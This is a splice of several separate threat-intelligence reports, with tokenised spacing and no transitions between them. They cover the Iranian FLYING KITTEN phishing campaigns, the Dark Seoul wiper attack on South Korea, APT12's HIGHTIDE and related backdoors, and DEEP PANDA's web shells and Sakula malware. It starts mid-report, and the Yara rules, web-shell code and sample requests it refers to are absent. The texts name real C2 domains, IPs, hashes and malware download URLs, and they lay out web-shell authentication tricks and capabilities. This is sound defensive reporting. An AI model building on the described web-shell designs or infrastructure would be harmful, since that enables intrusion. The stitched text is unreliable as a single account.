Meanwhile , the most recent sample in Group # 3 , which uses the updated loader with t the SHA1 value fecdba1d903a51499a3953b4df1d850fbd5438bd , also connects to another server at IP address 178.21.172.157 .
The updated loader has PDB path , C : \Projects\NEMESIS\ nemesis - gemina\nemesis\bin\carriers\ezlzma_x86_exe .
pdb .
The filenames for all Info - stealer samples are all generated at runtime ( see the Persistence section on page 7 ) .
Today , our friends at FireEye released a report on an Iran - based adversary they are calling Saffron Rose .
CrowdStrike Intelligence has also been tracking and reporting internally on this threat group since mid- January 2014 under the name FLYING KITTEN , and since that time has seen targeting of multiple U.S.- based defense contractors as well as political dissidents .
FireEye 's report notes that this adversary 's targeted intrusion activity consists of credential theft and malware delivery individually .
The FLYING KITTEN campaigns investigated by CrowdStrike Intelligence showed that the actor actually combines the two .
For example , the adversary will register a domain that spoofs the name of the targeted organization and then host a spoofed login page on that site .
The page is used to steal legitimate credentials , but once users enter the credentials , they are often redirected to a new page that prompts them to download a `` Browser Patch '' or other similar type of file .
The downloaded file is actually the Stealer malware that exfiltrates stolen data to an FTP server .
In addition to the aerospace / defense and dissident targeting , it also appears that FLYING KITTEN is also engaged in broader targeting via the website parmanpower [ .
] com .
This website is registered via the same registrant email ( info [ @ ] usa.gov.us ) and other Whois information as some of the other domains related to the activity discussed above .
It purports to be the website of a business engaged in recruiting , training , and development in Erbil , Iraq .
No malicious activity has been linked to this domain , however , the fact that it was registered under the same registrant email at the same time as other FLYING KITTEN domains linked to malicious activity , it is likely that the adversary is using this site for malicious purposes as well .
The website does not appear to deliver any malware , so its most likely purpose is to act as a credential - collection mechanism much like the spoofed Institute of Electrical and Electronics Engineers ( IEEE ) Aerospace Conference website ( aeroconf2014 [ .
] org ) the adversary used earlier this year .
This spoofed recruiting company website could be used to target entities across a wide range of sectors .
Attribution in this case is interesting , as the adversary appears to have made a mistake when registering its malicious domains .
The registrant email that currently appears in the Whois records of some of the FLYING KITTEN domains is info [ @ ] usa.gov.us , however historical records show that the domains were originally registered under the email address keyvan.ajaxtm [ @ ] gmail.com .
As FireEye 's report notes , the keyvan.ajaxtm @ gmail.com email address ties back to an Iran - based entity called Ajax Security Team .
Earlier this year , Ajax Security had an easily identifiable presence on the Internet with its own website and related Facebook pages .
This Internet presence has decreased significantly since early 2014 , likely due to a desire to keep a lower profile now that the group is engaged in targeted intrusion activity .
The following Yara rules will provide detection for the adversary remote access toolkit and exfiltration tool : You can use this rule with CrowdStrike 's free CrowdResponse tool to easily scan your systems for presence of FLYING KITTEN .
If you have any questions about these signatures or want to hear more about Flying Kitten and their tradecraft , please contact : intelligence @ crowdstrike.com and inquire about Falcon Intelligence , our Cyber Threat Intelligence subscription .
On March 20 , 2013 a cyber attack now known as Dark Seoul , paralyzed several major banking services and broadcasters in South Korea .
Labeled by the media as cyber terror , the attack significantly disrupted these services for at least one day .
Despite these facts , various indicators suggest that the attack had a low level of sophistication .
Major cyber attacks in the past such as Ten Days of Rain and the SK Communications breach employed far more advanced techniques compared to Dark Seoul .
We examine the technical details of Dark Seoul by outlining the primary attack vector used , describing the malware components , and discussing the malware 's evasion techniques .
Furthermore we compare this incident to previous attacks in order to determine its technical sophistication using these attacks as a relative benchmark .
Lastly we explore various malware design techniques that were not used in the malware such as multiple propagation vectors , 0-day exploits , and evasion techniques , thus presenting a proof of concept of the malware 's low technical sophistication .
Keywords : advanced persistent threat ; cyber attack ; Dark Seoul ; defense ; malware analysis ; On March 20 , 2013 , at approximately 14.15PM South Korea suffered a cyber attack that resulted in the denial of service of several major banks and broadcasters .
Reported as a major cyber attack , our analysis of the malware and attack vectors employed suggests that the malware had a relatively low level of technical sophistication .
Firstly we explore the technical components of Dark Seoul to analyze the sophistication of the malware and attack vectors used .
This analysis is based on information obtained from the media as well as technical reports of various malware research labs such as AhnLab , Imperva , Symantec , Avast , Kaspersky , Alienvault , and Sophos .
Secondly we conduct a comparative study of Dark Seoul by looking at prior cyber attacks , namely Stuxnet , 10 Days of Rain , and the SK Communications breach .
By doing so we draw a picture of South Korea 's current security posture since those attacks .
Lastly we discuss several design characteristics of advanced malware used by determined adversaries to carry out more technically advanced and stealthier attacks , therefore highlighting the components where Dark Seoul lacked sophistication .
Television broadcasters YTN , MBC , and banks KBS , Shinhan , Nonghyup , and Jeju were targeted in this recent attack .
The Korea Internet Security Agency ( KISA ) reported that about 48,000 computers were affected making service inaccessible and the victim organizations needed weeks to fully restore all functions .
In terms of impact , the attackers managed to successfully penetrate the target networks , pivot their way into critical assets , wipe out systems , cause denial of services , and trigger enough public response to spur the media into using terminology such as cyber terror and advanced persistent threats .
In this paper we take an in - depth look of the malware by examining the attack vectors used , and later discuss whether the claims in the media are warranted .
According to the investigating team consisting of government , military , and civilian members , as many as 76 samples of malware were collected from infected machines .
We present the most likely primary attack vector used by the attackers by discussing information summarized from reports by Avast , Trend Micro , and Symantec issued in the first few days following the attack .
Trend Micro researchers discovered a phishing email sent to South Korean organizations on March 19 .
The email contained a malicious Trojan downloader which the researchers report to have been detected by their Deep Discovery software .
This is likely to be the initial attack point .
Avast detected the attacks originating from the Korea Software Property Right - Council ( SPC ) website ( http : //www.spc.or.kr ) possibly infected via the phishing email sent on the 19th .
Usage of a legitimate website / server in the target nation / region for launching attacks is a common tactic used to minimize detection .
The SPC website contained JavaScript causing the client browser to load an iframe loading the contents of http : //rootadmin2012.com , which was the main attack site for hosting the malicious payloads .
Examination of rootadmin2012.com revealed heapspray and shellcodes with references to Internet Explorer ( IE ) .
Avast managed to identify the vulnerability exploited as CVE-2012 - 1889 which allows remote attackers to execute arbitrary code or cause a denial of service via a crafted website .
The vulnerability targets Microsoft XML Core Services 3.0 – 6.0 with a published metasploit exploit targeting MS XML Core Services 3.0 via IE6 and IE7 over Windows XP .
After gaining access the second stage downloader file ( sun.exe ) performs the following actions : a .
Check for internet connection : Downloads an image from naver.com .
b .
Local DNS cache poisoning : Redirects requests to certain Korean banking websites listed in Figure 2 to another server in Japan .
c. Update download counter : Runs a counter script by opening http : //myadmin2012.com / tong.htm .
d. Makes itself persistent : Modifies the Windows registry by adding value with name `` skunser '' and data `` C : \ntldrs\svchest.exe '' , where it was previously copied to .
e. Download backdoor : Downloads dropper file pao.exe from http : //www.hisunpharm.com / files / File / product/ and stores it to C : \Program Files\tongji2.exe f. Drops and execute batch file : schedules downloader every 30 minutes and ensures svchest.exe is started with Local System privileges .
The tongji2.exe module injects itself into iexplore.exe in an attempt to mask itself .
Avast classified this as a backdoor Trojan and infostealer .
This malware allowed attackers to control the computer as a compromised zombie part of a wider botnet network – a theory suggested by Alienvault – which then wiped hard disks , and harvested personal information .
Examination of the file names and the Safeengine executable protector suggest that the malware was made in China .
Although capable of executing many functions , only the following were widely utilized in the attack : a. Antivirus disablement : Malware attempts to disable Ahnlab and Hauri antivirus .
b .
Command & control ( C & C ) : Using a simple XOR loop for encryption , the malware attempts to connect to laoding521.eicp.net over port 889 to communicate with the attackers .
c. Harddisk wiper : Symantec identified Trojan . Jokra as the malware component that wiped harddisks in the attack .
It is likely that it was downloaded onto the victim 's computer after receiving an instruction by the C & C servers .
The malware overwrites the master boot record ( MBR ) and the rest of the harddisk with the strings `` PRINCIPES '' or `` HASTATI . '' .
Other attached drives or removable devices may also be targeted .
The malware then forces the computer to restart thus making it unusable .
An interesting feature of this malware is that it has components to wipe out harddisks on both Windows and Linux platforms .
Detailed analysis of Jokra can be found here .
d. Information harvesting : After gaining root privileges the attackers can intercept any information that goes in or out of the infected computer .
However the most apparent information taken was user credentials .
As a result of DNS poisoning , users believe they are accessing the authentic internet banking website , but are decepted into interacting with a fake website .
An error message pops up stating that the user 's computer was infected by a virus and that for security reasons they need to apply for a fraud prevention service .
If the user clicks the OK button , the user is directed to a page requesting their name and national identification number .
If the format entered is correct , the user is then asked to fill in more details including address , phone number , etc .. Stuxnet was discovered in July 2010 , but the earliest known variant is confirmed to have existed since 2007 .
Stuxnet caught many security researchers and professionals by surprise , being the first advanced malware of its kind .
According to Symantec 's report , Stuxnet is a complex threat that was primarily written to target an industrial control system ( ICS ) or set of similar systems .
A vast array of components was implemented in the malware including four 0-Day exploits , a windows rootkit , antivirus evasion techniques , complex process injection and hooking code , network infection routines , peer - to - peer updates , a command and control interface , as well as the first ever PLC rootkit .
Stuxnet 's main payload has the main purpose of modifying code on Siemens industrial PLCs in order to sabotage the system .
It is widely believed that Iran 's Natanz nuclear Fuel Enrichment Plant ( FEP ) was the intended target .
Hosts in five domains of organizations based in Iran were heavily infected over 3 attack waves .
The deliberate containment of the malware to targets in Iran is also apparent from the number of hosts infected worldwide , which reached only around 100,000 with approximately 60 % being in Iran .
This attack has been claimed to setback Iran 's nuclear program by several years as 1,000 out of 9,000 centrifuges were disabled and had to be replaced .
The initial attack point is likely to be via a USB infection .
On March 4 , 2011 , exactly 20 months after a similar incident during the U.S .
Independence Day celebrations of 2009 , a botnet based in South Korea launched DDoS attacks against 40 websites affiliated with South Korean government , military , and civilian critical infrastructure as well as U.S. forces based in Korea .
The botnet was dynamically updated via new malware binaries , launched a DDoS non - stop for more than a week , and then wiped the harddisks with zeroes , overwriting the MBR making the machines unusable .
This attack used malware with a much higher level of sophistication than is necessary to launch a trivial distributed denial of service ( DDoS ) attack .
Encryption of code and configurations using cipher algorithms such as the Advanced Encryption Standard ( AES ) , RSA , and Rivest Cipher 4 ( RC4 ) enabled them to evade detection and prolong analysis .
A multitier botnet architecture included 40 C & C servers distributed across the globe including servers in the USA , Taiwan , Saudi Arabia , Russia , and India .
Highlighting the overkill in this attack , McAfee went so far as to call it `` analogous to bringing a Lamborghini to a go - cart race '' Considering the limited timeframe scope and target list , McAfee suggested the motivation of the attack was a cyber war exercise to test the preparedness of South Korea 's cyber defense capabilities and to better understand the technical requirements for a successful campaign .
In July 2011 SK Communications became the victim of an attack that resulted in the loss of the personal details of 35 million users .
The users of CyWorld and Nate , services owned by SK Communications , were affected by this attack .
Judging from the sophistication of the attack and the time needed for planning it , researchers concluded that the attack was likely to be carried out by an Advanced Persistent Threat .
Between July , 18 and 25 , more than 60 computers were infected then used to gain access to the user databases .
The launch point was a South Korean software company 's update server , normally used to deliver software updates to customers .
The attackers compromised the server and created a Trojan that would be downloaded to user computers during a routine update .
Poor change management policy resulted in the full trust of software updates , allowing attackers to fully exploit this weakpoint .
During this time attackers used C & C servers to monitor the activities on the infected machines and uploaded tools on a previously compromised legitimate Taiwanese website .
An elaborate infrastructure of waypoints and C & C servers was created to make tracing the sources of their activities difficult .
In - depth investigation of the attack reveal that preparation went back as early as September 2010 before finally culminating in the compromise of the user databases between July 26 - 28 , 2011 .
Comparing Dark Seoul with previous attacks shows that it was technically low in sophistication while causing high impact to the organizations affected .
An intuitive indicator ofthis sophistication is that it was completely preventable if the organizations had used existing software updates and antivirus solutions , whereas prior attacks could not have been detected .
However judging from the high number of infections , services disrupted , and the fact that information was being harvested from the infected machines at least 8 months before the d- day wipeout , we consider the impact to be high .
To increase the probability of successfully infecting the target systems , various propagation vectors should be embedded into the malware .
The most likely attack vector is social engineering via phishing emails , USB sticks , and other techniques .
Although people can be used as the initial point of entry , propagation needs to continue laterally through the network till the specific target host is reached .
During this process the malware may need higher privileges ( e.g .
root ) and further exploits will be utilized .
Therefore the persistent adversary will need to consider multiple vectors to infiltrate target systems .
The problem with publicly published vulnerabilities is people can defend against them .
0-day exploits are written to exploit vulnerabilities that have not been disclosed to the public nor the concerned software vendor .
These exploits are at the core payload of any advanced malware , and are virtually unstoppable until vendors release a patch or anti - virus providers come up with a signature definition .
The only other method of minimizing the 0-day threat is by actively designing security into software .
Dark Seoul did not use any 0-days .
The deployment of anti - virus software , intrusion detection systems , firewalls and other malware detection or prevention technology has done much to defend against many attacks .
Advanced malware bypasses these defenses by employing techniques such as dynamic botnet obfuscation , network based fragmentation and session splicing , application or protocol violations , disabling intrusion detection systems ( IDSs ) , to more advanced techniques such as encryption and code reuse attacks .
Carefully crafted exploits can avoid even advanced heuristic detection algorithms used in today 's anti - virus software .
Evasion techniques are crucial for successful attacks against high level targets , such as in the case of the Iranian nuclear program .
Dark Seoul was a low tech threat which managed to escalate into a high impact attack .
Successful in carrying out its goals , the malware was lacking in many areas that would be typically found in attacks by advanced persistent threats .
We highlighted the components of the malware used and the possible design principles that could have been employed to make the attack more sophisticated .
South Korea is more at risk now than before the attack , as now adversaries less capable than advanced persistent threats realize they could also successfully perform damaging attacks .
Undertaking the needed remediation strategies to prevent similar attacks as well as understanding the anatomy of more advanced malware is vital for mounting an adequate defense against the advanced cyber threats .
The attackers referred to as APT12 ( also known as IXESHE , DynCalc , and DNSCALC ) recently started a new campaign targeting organizations in Japan and Taiwan .
APT12 is believed to be a cyber espionage group thought to have links to the Chinese People 's Liberation Army .
APT12′s targets are consistent with larger People 's Republic of China ( PRC ) goals .
Intrusions and campaigns conducted by this group are in- line with PRC goals and self - interest in Taiwan .
Additionally , the new campaigns we uncovered further highlight the correlation between APT groups ceasing and retooling operations after media exposure , as APT12 used the same strategy after compromising the New York Times in Oct 2012 .
Much like Darwin 's theory of biological evolution , APT12 been forced to evolve and adapt in order to maintain its mission .
The new campaign marks the first APT12 activity publicly reported since Arbor Networks released their blog `` Illuminating The Etumbot APT Backdoor .
'' FireEye refers to the Etumbot backdoor as RIPTIDE .
Since the release of the Arbor blog post , FireEye has observed APT12 use a modified RIPTIDE backdoor that we call HIGHTIDE .
This is the second time FireEye has discovered APT12 retooling after a public disclosure .
As such , FireEye believes this to be a common theme for this APT group , as APT12 will continue to evolve in an effort to avoid detection and continue its cyber operations .
FireEye researchers also discovered two possibly related campaigns utilizing two other backdoors known as THREEBYTE and WATERSPOUT .
Both backdoors were dropped from malicious documents built utilizing the `` Tran Duy Linh '' exploit kit , which exploited CVE-2012 - 0158 .
These documents were also emailed to organizations in Japan and Taiwan .
While APT12 has previously used THREEBYTE , it is unclear if APT12 was responsible for the recently discovered campaign utilizing THREEBYTE .
Similarly , WATERSPOUT is a newly discovered backdoor and the threat actors behind the campaign have not been positively identified .
However , the WATERSPOUT campaign shared several traits with the RIPTIDE and HIGHTIDE campaign that we have attributed to APT12 .
From October 2012 to May 2014 , FireEye observed APT12 utilizing RIPTIDE , a proxy - aware backdoor that communicates via HTTP to a hard - coded command and control ( C2 ) server .
RIPTIDE 's first communication with its C2 server fetches an encryption key , and the RC4 encryption key is used to encrypt all further communication .
In June 2014 , Arbor Networks published an article describing the RIPTIDE backdoor and its C2 infrastructure in great depth .
The blog highlighted that the backdoor was utilized in campaigns from March 2011 till May 2014 .
Following the release of the article , FireEye observed a distinct change in RIPTIDE 's protocols and strings .
We suspect this change was a direct result of the Arbor blog post in order to decrease detection of RIPTIDE by security vendors .
The changes to RIPTIDE were significant enough to circumvent existing RIPTIDE detection rules .
FireEye dubbed this new malware family HIGHTIDE .
On Sunday August 24 , 2014 we observed a spear phish email sent to a Taiwanese government ministry .
Attached to this email was a malicious Microsoft Word document ( MD5 : f6fafb7c30b1114befc93f39d0698560 ) that exploited CVE-2012 - 0158 .
It is worth noting that this email appeared to have been sent from another Taiwanese Government employee , implying that the email was sent from a valid but compromised account .
The exploit document dropped the HIGHTIDE backdoor with the following properties : The HIGHTIDE backdoor connected directly to 141.108.2.157 .
If you compare the HTTP GET request from the RIPTIDE samples ( Figure 1 ) to the HTTP GET request from the HIGHTIDE samples ( Figure 3 ) you can see the malware author changed the following items : User Agent Format and structure of the HTTP Uniform Resource Identifier ( URI ) Similar to RIPTIDE campaigns , APT12 infects target systems with HIGHTIDE using a Microsoft Word ( .doc
) document that exploits CVE-2012 - 0158 .
FireEye observed APT12 deliver these exploit documents via phishing emails in multiple cases .
Based on past APT12 activity , we expect the threat group to continue to utilize phishing as a malware delivery method .
When the file is opened , it drops HIGHTIDE in the form of an executable file onto the infected system .
RIPTIDE and HIGHTIDE differ on several points : executable file location , image base address , the User- Agent within the GET requests , and the format of the URI .
The RIPTIDE exploit document drops its executable file into the C : \Documents and Settings\ { user } \Application Data\Location folder while the HIGHTIDE exploit document drops its executable file into the C : \DOCUMENTS and SETTINGS\ { user } \LOCAL SETTINGS\Temp\ folder .
All but one sample that we identified were written to this folder as word.exe .
The one outlier was written as winword.exe .
Research into this HIGHTIDE campaign revealed APT12 targeted multiple Taiwanese Government organizations between August 22 and 28 .
On Monday August 25 , 2014 we observed a different spear phish email sent from lilywang823 @ gmail.com to a technology company located in Taiwan .
This spear phish contained a malicious Word document that exploited CVE-2012 - 0158 .
The MD5 of the exploit document was e009b95ff7b69cbbebc538b2c5728b11 .
Similar to the newly discovered HIGHTIDE samples documented above , this malicious document dropped a backdoor to C : \DOCUMENTS and SETTINGS\ { user } \LOCAL SETTINGS\Temp\word.exe .
This backdoor had the following properties : This backdoor sent the following callback traffic to video [ .
] csmcpr [ .
] com : The THREEBYTE spear phishing incident ( while not yet attributed ) shared the following characteristics with the above HIGHTIDE campaign attributed to APT12 : The THREEBYTE backdoor was compiled two days after the HIGHTIDE backdoors .
Both the THREEBYTE and HIGHTIDE backdoors were used in attacks targeting organizations in Taiwan .
Both the THREEBYTE and HIGHTIDE backdoors were written to the same filepath of C : \DOCUMENTS and SETTINGS\ { user } \LOCAL SETTINGS\Temp\word.exe .
APT12 has previously used the THREEBYTE backdoor .
On August 25 , 2014 , we observed another round of spear phishing emails targeting a high - technology company in Japan .
Attached to this email was another malicious document that was designed to exploit CVE-2012 - 0158 .
This malicious Word document had an MD5 of 499bec15ac83f2c8998f03917b63652e and dropped a backdoor to C : \DOCUMENTS and SETTINGS\ { user } \LOCAL SETTINGS\Temp\word.exe .
The backdoor had the following properties : The backdoor connects to a command and control server at icc [ .
] ignorelist [ .
] com .
Similar to RIPTIDE and HIGHTIDE , the WATERSPOUT backdoor is an HTTP - based backdoor that communicates with its C2 server .
Although there are no current infrastructure ties to link this backdoor to APT12 , there are several data points that show a possible tie to the same actors : Same initial delivery method ( spear phishing email ) with a Microsoft Word Document exploiting CVE-2012 - 0158 .
The same `` Tran Duy Linh '' Microsoft Word Exploit Kit was used in delivery of this backdoor .
Similar Targets were observed where the threat actors utilized this backdoor .
Japanese Tech Company Taiwanese Government Organizations Organizations in the Asia - Pacific Region that are of Interest to China The WATERSPOUT backdoor was written to the same file path as the HIGHTIDE backdoors : C : \DOCUMENTS and SETTINGS\ { user } \LOCAL SETTINGS\Temp\word.exe C : \DOCUMENTS and SETTINGS\ { user } \LOCAL SETTINGS\Temp\winword.exe WATERSPOUT was compiled within two days of the last HIGHTIDE backdoor and on the same day as the THREEBYTE backdoor .
Although these points do not definitively tie WATERSPOUT to APT12 , they do indicate a possible connection between the WATERSPOUT campaign , the THREEBYTE campaign , and the HIGHTIDE campaign attributed to APT12 .
FireEye believes the change from RIPTIDE to HIGHTIDE represents a temporary tool shift to decrease malware detection while APT12 developed a completely new malware toolset .
These development efforts may have resulted in the emergence of the WATERSPOUT backdoor .
APT12 's adaptations to public disclosures lead FireEye to make several conclusions about this threat group : APT12 closely monitors online media related to its tools and operations and reacts when its tools are publicly disclosed .
APT12 has the ability to adapt quickly to public exposures with new tools , tactics , and procedures ( TTPs ) .
Public disclosures may result in an immediate change in APT12 's tools .
These changes may be temporary and FireEye believes they are aimed at decreasing detection of their tools until a more permanent and effective TTP change can be implemented ( e.g. , WATERSPOUT ) .
Though public disclosures resulted in APT12 adaptations , FireEye observed only a brief pause in APT12 activity before the threat actors returned to normal activity levels .
Similarly , the public disclosure of APT12 's intrusion at the New York Times also led to only a brief pause in the threat group 's activity and immediate changes in TTPs .
The pause and retooling by APT12 was covered in the Mandiant 2014 M- Trends report .
Currently , APT12 continues to target organizations and conduct cyber operations using its new tools .
Most recently , FireEye observed HIGHTIDE at multiple Taiwan - based organizations and the suspected APT12 WATERSPOUT backdoor at a Japan - based electronics company .
We expect that APT12 will continue their trend and evolve and change its tactics to stay ahead of network defenders .
Note : IOCs for this campaign can be found here .
This entry was posted in Botnets , Targeted Attack , Threat Intelligence , Threat Research and tagged advanced malware , advanced persistent threat , advanced targeted attack , advanced threat actor , APT12 , Targeted Attack by Ned Moran , Mike Oppenheim , Sarah Engle and Richard Wartell .
Bookmark the permalink .
Disclaimer : CrowdStrike derived this information from investigations in non - classified environments .
Since we value our client 's privacy and interests , some data has been redacted or sanitized .
Crowdstrike presents `` Mo ' Shells Mo ' Problems '' - A four part series featuring two unique web shells used by a Chinese threat group we call Deep Panda .
The series will culminate with a CrowdCast in April 2014 detailing a case study of the incident response investigation conducted to identify these web shells .
Special thanks to Josh Phillips of the CrowdStrike Global Intelligence Team for providing the technical analysis in this blog post .
Today we 'll cover part one of this series , which provides an overview of what web shells are , functionality of two web shells recently identified during an incident response investigation and how they were leveraged by the attacker .
Parts two through four will provide details on successful analytical techniques you can use to discover web shells within your environment : A Web Shell is a file containing backdoor functionality written in a web scripting language such ASP , ASPX , PHP or JSP .
When a web shell is hosted on an internet facing victim system , an adversary can remotely access the system to perform malicious actions .
Deep Panda is a China based threat group CrowdStrike has observed targeting companies in the defense , legal , telecommunication and financial industries .
Crowdstrike has observed Deep Panda adopting web shells as their primary access back into a victim organization .
This is an interesting shift as web shells have typically been seen as only a first stage into obtaining a persistent foothold in an environment .
Previously , web shells were quickly abandoned once persistent second stage malware was successfully beaconing .
Using a web shell as a primary backdoor gives Deep Panda several advantages : Low to virtually no detection by antivirus products The absence of command and control beacon traffic Impossible to block known malicious IP addresses to a web server since adversary can easily change their source IP address Cookie and HTTP header authentication aware web shells avoid being enumerated by search engines and restrict access , further reducing their network footprint To assist organizations with identifying web shells in their environment , this post will cover two popular Deep Panda web shells .
By gaining insight into their capabilities and footprint , organizations should find it feasible to detect and remediate these backdoors .
Showimg.asp is an example of an early stage web shell used to build an initial foothold within a network .
After it is replaced by more robust backdoors , it may be left in place as a last resort should remediation take place .
At a diminutive 28 bytes , it is one of the smallest Active Server Page ( ASP ) backdoors in the wild .
In a recent case , we witnessed this web shell written to a standalone file ( named showimg.asp ) , but it could easily be injected into an existing page , making it even stealthier .
The code for this web shell can be found below : ASP uses Microsoft Visual Basic ( VBScript ) as its implementation language .
The code above uses the chr ( ) function to convert an integer into a character , which is then passed as an argument to the ASP Request ( ) object .
The Request ( ) object will search the Query String for any keys matching the input .
In our case , the code is equivalent to Request . QueryString ( ' * ' ) .
The request object will look for chr ( 42 ) which is an asterisk ( * ) , returning whatever is passed to it in a HTTP GET or POST .
Next , the Execute ( ) function will execute any value returned by the lookup .
Effectively , an attacker can form a request that will execute any VBScript code .
As you might imagine , this is a powerful capability .
For example , this code can perform any of the following actions : File upload or download File system read , write , or delete Arbitrary command execution This web shell is an example of a `` thick client '' shell , meaning that while the server side code is quite small , attackers typically use a larger GUI client to construct the sent commands .
The client GUI runs on the attacker 's system and hence is not typically found within the victim network .
As a simple example of an encoded command , the following GET request would cause the backdoor to execute the code Response . Write ( `` < h1 > Hello World < /h1 > '' ) and would render '' Hello World '' to be printed in the web browser : Path : C : \inetpub\wwwroot\aspnet_client\system_web\ < VERSION > \ MD5 Hash : cc875db104a602e6c12196fe90559fb6 File Size : 45187 Table 4 : Metadata of `` system_web.aspx '' System_web.aspx is an excellent example of a more robust web shell used to replace Deep Panda 's traditional beaconing command and control infrastructure .
It is an ASP.NET backdoor written in C # , with far more capabilities than we saw with the showimage.asp sample .
The web shell supports a form of authentication to protect against unauthorized access .
This prevents its discovery from search engine indexing , vulnerability scanning tools and other unauthorized access to the backdoor .
In order to bypass authentication , a user session must satisfy one of three options : Pass a cookie with the name < Redacted > Set the Keep - Alive HTTP header to 320 Set language HTTP header to contain es - DN Since web shells are text - based , we can easily see how this authentication takes place : First , the code checks if a cookie by the name of cp exists .
If so , the response object has its End ( ) method invoked , denying the user access .
Next , the code uses the IsValidUser ( ) method and checks the Hyper Text Transport Protocol ( HTTP ) headers for the Keep - Alive value , which , if equal to 320 , will return true .
If the value does not equal 320 the IsValidUser ( ) method iterates over the Request . UserLanguages collection searching for a language named es - DN , and if found , the IsValidUser ( ) method will return true .
If neither check passes , the code returns false and the code will finally check for the presence of a cookie named < REDACTED > .
If the cookie is present , the authentication step is satisfied .
If not , a blank web page with no content is displayed .
After successful authentication , the attacker is provided with the following page : System_web.aspx packs a large amount of functionality into a compact interface .
It provides the following capabilities : Enumerate attached drives Utilize built in SQL functions to connect to database backend Run SQL queries and statements Download , upload and read files Directory listing Execute Active Directory requests Compile and execute arbitrary C # source code Impersonate a user The web shell supports 8 main commands , with most command execution via Transact - SQL using the xp_cmdshell function .
This command depends on the contents of the first unlabeled textbox1 .
If unlabeled textbox1 is empty , the code will enumerate attached drives .
Provider= or Driver= - Will connect using the OleDbConnection class .
Data Source= - The code will connect using the SqlConnection class .
iis : // - If this appears in unlabeled textbox1 , the code will use data from the second unlabeled textbox2 to execute Active Directory requests .
This command also depends on the text contained in the unlabeled textbox1 .
If the field is left empty , the code will assume a valid path to a file on the local machine and will read and display contents to user .
Data Source= - the code will assume that the unlabeled textbox2 contains a valid SQL query and will execute it and display the results .
http : // - If this appears in unlabeled textbox1 , download content from the assumed URL .
$ SEX – If this appears in unlabeled textbox1 , pass the contents to the Server . Execute ( ) method .
Execute contents in unlabeled textbox1 as a SQL query and return binary data to adversary .
Execute contents in unlabeled textbox1 as a SQL statement and return valid textual data to adversary .
Upload the file chosen by the Choose File button and save it to a temporary table in the database file worktbl in chunks of 10240 bytes .
Then executes xp_cmdshell ( which executes the Bulk Copy Program ) to copy the data from that table to a file whose name is specified in unlabeled textbox2 .
After the file is saved , the code deletes the temporary table .
If unlabeled textbox1 is a local file on infected system , the file is read and displayed to attacker .
\\ - If unlabeled textbox1 starts with \\ , use xp_cmdshell to execute the copy command to copy file to % windir % \Temp\temp.bin .
Then , issue the dir command and display results to user .
Finally , delete the temporary file % windir % \Temp\temp.bin .
Perform Active Directory queries .
The code handles create , delete , set , get , and enum queries , while any query not matching those is executed directly .
All commands are executed using the System . DirectoryServices API .
Simple wrapper around the CSharpCodeProvider API , allowing the adversary to compile and execute arbitrary C # source code .
Attempt to use the username , password , and domain from the User , Pass and Domain fields and LogonUserA ( ) Win32 API function to impersonate a specific user .
Specifies whether commands run from the Exec button will have their output redirected and displayed to the adversary when the command is finished executing .
In short , system_web.aspx provides an adversary with a very stealthy means of near full control of the server on which it resides .
This stealth might be its most important attribute .
As we will see , identifying web shells can be much harder than finding malicious binaries .
In our next post , we will discuss techniques for identifying web shells .
Stay tuned for Parts 2 - 4 as we cover File Stacking , Web Log Review , and Network Detection .
In the meantime , register now for the April 1st CrowdCast .
Over the last few months , the CrowdStrike Intelligence team has been tracking a campaign of highly targeted events focused on entities in the U.S. Defense Industrial Base ( DIB ) , healthcare , government , and technology sectors .
This campaign infected victims with Sakula malware variants that were signed with stolen certificates .
Investigation into this activity led to associations with the adversary known to CrowdStrike as DEEP PANDA .
On 31 July 2014 , an executable was identified , which , at the time , was not detected by any anti - virus products .
When this file was executed , it caused the victim to view a website by using the ShellExecute ( ) API to open a URL .
The site 's domain name was meant to spoof that of a site set up to provide information on an alumni event for a U.S university .
This page requested that the visitor download an Adobe - related plugin in order to view the content .
The downloaded plugin file included a variant of Sakula malware .
[ 1 ] The Sakula malware in this campaign utilized the Dynamic Link Library ( DLL ) side - loading technique most commonly associated with PlugX activity .
In the aforementioned university - related incidents , a legitimate executable named MediaSoft.exe ( MD5 hash : d00b3169f45e74bb22a1cd684341b14a ) loaded a file named msi.dll ( MD5 hash : ae6f33f6cdc25dc4bda24b2bccff79fe ) , which , in turn , was used to load the Sakula executable ( MD5 hash : 0c2674c3a97c53082187d930efb645c2 ) .
This final executable was also signed with a certificate assigned to an organization called DTOPTOOLZ Co. , Ltd. Command - and - Control ( C2 ) communications in this incident went directly to IP address 180.210.206.246 ; a sample GET request is below : Further investigation revealed similar activity stretching back to at least April 2014 , when similar TTPs were used to target a healthcare organization and a U.S .- based IT company with high - profile clients in the defense sector .
Two other incidents were also identified in August 2014 targeting a company in the DIB and a Mongolian government entity .
All incidents in this campaign were similar in that they utilized malicious droppers masquerading as installers for legitimate software applications like Adobe Reader , Juniper VPN , and Microsoft ActiveX Control .
They display progress bars that make it appear as if the specified software is being updated or installed .
In addition , the droppers all directed victims to login pages for services specific to the target organization like webmail , document sharing , or corporate VPN .
In all cases except one , the victims were directed to legitimate login pages .
The one exception was a case in which victims were sent to a login page hosted on a domain that spoofed that of the legitimate one .
It is unclear whether redirecting victims to these login pages was part of credential - collection activity or merely meant to deceive victims into believing that the activity was legitimate .
The campaign appeared to be over by the end of August , but a file was recently discovered that suggests it may be ongoing .
The intended target again appeared to be a Mongolian government entity , and the file masqueraded as an installer for Microsoft ActiveX software .
It dropped the side - loaded Sakula malware just like in the other incidents ; however , in this instance , the Sakula payload was signed with a certificate assigned to a different organization , Career Credit Co. , Ltd .
The malware used the domain www [ .
] xha- mster [ .
] com for C2 which was created in mid - September and is registered with the email address wendellom @ yahoo.com and registrant name `` tonyy starke '' ( hence the name , Ironman - related title for this blog ) .
Below is a chart showing the relevant relationships to this DEEP PANDA campaign .
The bottom of the chart shows an infrastructure connection between an IP address ( 198.200.45.112 ) used this campaign and also used in recently observed DEEP PANDA activity .
In September 2014 , CrowdStrike Intelligence identified a malicious file signed with the DTOPTOOLZ Co. , Ltd. certificate .
Analysis of this file revealed it to be Derusbi malware ( a favorite RAT of DEEP PANDA ) that used the domain vpn [ .
] foundationssl [ .
] com for its C2 .
At the time of discovery , CrowdStrike did not attribute the file to DEEP PANDA based on the malware alone , but the use of the DTOPTOOLZ certificate to sign a malware variant known to be heavily used by this adversary makes it likely that this signed Derusbi sample is also attributable to DEEP PANDA .
In a recent public report from PWC , another foundationssl [ .
] com domain was linked to activity involving the Strategic Web Compromise ( SWC ) framework more commonly known as Scanbox .
